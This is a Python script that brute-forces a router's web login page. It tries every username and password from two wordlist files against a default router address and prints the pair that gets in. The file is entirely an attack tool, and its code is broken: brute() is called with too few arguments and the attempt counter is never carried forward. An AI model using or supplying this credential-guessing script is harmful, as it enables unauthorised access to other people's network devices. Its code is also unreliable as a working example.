import requests
import sys

url = "http://192.168.1.1"  # Check address.md for routers' default IP address.

expression = b"incorrect"  # changed to bytes-like object.

def brute(username, password, combinations_tested):
    data = {'username': username, 'password': password}
    r = requests.post(url, data=data)
    #print("Server response: ", r.content)  # (optional) print server response
    combinations_tested += 1
    sys.stdout.write("\rCombinations tested: %d" % combinations_tested)
    sys.stdout.flush()
    if expression not in r.content:
        print("Brute Forcing...")
        print("[+] Username: ", username)
        print("[+] Password: ", password)
        sys.exit()
    return combinations_tested # add quantity of combinations


def main():
    usernames = [u.strip() for u in open("username.txt", "r").readlines()] # add username.txt usage 
    passwords = [p.strip() for p in open("password.txt", "r").readlines()]
    for username in usernames:
        for password in passwords:
            brute(username, password)  

if __name__ == '__main__':
    main()
